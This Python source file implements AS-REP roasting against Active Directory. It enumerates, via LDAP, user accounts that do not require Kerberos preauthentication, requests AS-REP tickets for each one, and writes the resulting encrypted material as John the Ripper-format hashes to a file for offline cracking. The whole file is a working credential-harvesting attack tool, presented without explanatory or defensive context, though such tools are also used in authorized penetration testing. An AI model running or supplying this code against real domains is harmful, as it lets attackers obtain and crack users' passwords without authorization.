from ldap3 import Server, Connection, ALL, ALL_ATTRIBUTES, LEVEL, SUBTREE, ALL_OPERATIONAL_ATTRIBUTES
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from binascii import hexlify
import datetime, random
from termcolor import colored


class ASREPRoasting():


    def __init__(self, dc_string, server, ldapconn):
        self.ldapProps = ["*"]
        self.dc_string = dc_string
        self.server = server
        self.conn = ldapconn
        self.enumKerbPre()


    def enumKerbPre(self):
        # Build user array
        users = []
        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.server))
        if len(users) == 0:
            print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
        elif len(users) == 1:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} account that does not require Kerberos preauthentication'.format(len(users)))
        else:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
    
        hashes = []
        # Build request for Tickets
        for usr in users:
            clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            asReq = AS_REQ()
            domain = str(self.server).upper()
            serverName = Principal('krbtgt/{0}'.format(domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            pacReq = KERB_PA_PAC_REQUEST()
            pacReq['include-pac'] = True
            encodedPacReq = encoder.encode(pacReq)
            asReq['pvno'] = 5
            asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
            asReq['padata'] = noValue
            asReq['padata'][0] = noValue
            asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
            asReq['padata'][0]['padata-value'] = encodedPacReq

            requestBody = seq_set(asReq, 'req-body')

            options = list()
            options.append(constants.KDCOptions.forwardable.value)
            options.append(constants.KDCOptions.renewable.value)
            options.append(constants.KDCOptions.proxiable.value)
            requestBody['kdc-options'] = constants.encodeFlags(options)

            seq_set(requestBody, 'sname', serverName.components_to_asn1)
            seq_set(requestBody, 'cname', clientName.components_to_asn1)

            requestBody['realm'] = domain

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
            requestBody['till'] = KerberosTime.to_asn1(now)
            requestBody['rtime'] = KerberosTime.to_asn1(now)
            requestBody['nonce'] = random.getrandbits(31)

            supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

            seq_set_iter(requestBody, 'etype', supportedCiphers)

            msg = encoder.encode(asReq)

            try:
                response = sendReceive(msg, domain, self.server)
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                    seq_set_iter(requestBody, 'etype', supportedCiphers)
                    msg = encoder.encode(asReq)
                    response = sendReceive(msg, domain, self.server)
                else:
                    print(e)
                    continue

            asRep = decoder.decode(response, asn1Spec=AS_REP())[0]

            hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))

        if len(hashes) > 0:
            with open('{0}-jtr-hashes'.format(self.server), 'w') as f:
                for h in hashes:
                    f.write(str(h) + '\n')

            print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.server))
        else:
            print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')
